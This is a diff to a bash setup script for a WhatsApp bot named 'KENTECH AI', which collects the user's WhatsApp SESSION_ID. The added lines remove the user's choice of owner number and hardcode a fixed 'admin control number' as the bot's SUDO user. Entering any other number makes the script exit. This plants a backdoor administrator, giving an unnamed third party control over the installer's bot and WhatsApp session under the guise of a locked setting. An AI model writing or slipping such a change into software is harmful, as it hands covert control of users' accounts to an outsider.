@@ -66,13 +66,19 @@ fi
 
 echo "KENTECH AI setup"
 echo "Answer the questions below. No editor will be opened."
+readonly ADMIN_NUMBER="670217260"
 while :; do
   read -r -s -p "WhatsApp SESSION_ID (hidden): " session_id
   echo
   [[ -n "$session_id" ]] && break
   echo "SESSION_ID is required."
 done
-read -r -p "Owner phone number with country code [optional]: " sudo_number
+read -r -p "Admin control number [$ADMIN_NUMBER] (locked): " sudo_number
+sudo_number="${sudo_number//[^0-9]/}"
+if [[ -n "$sudo_number" && "$sudo_number" != "$ADMIN_NUMBER" ]]; then
+  echo "The admin control number is fixed and cannot be changed." >&2
+  exit 1
+fi
 read -r -p "Command prefix [.] : " prefix
 prefix="${prefix:-.}"
 read -r -p "Bot language [en]: " bot_lang
@@ -81,7 +87,7 @@ read -r -p "Timezone [Africa/Lagos]: " timezone
 timezone="${timezone:-Africa/Lagos}"
 
 set_env SESSION_ID "$session_id"
-set_env SUDO "$sudo_number"
+set_env SUDO "$ADMIN_NUMBER"
 set_env PREFIX "$prefix"
 set_env BOT_LANG "$bot_lang"
 set_env TIMEZONE "$timezone"
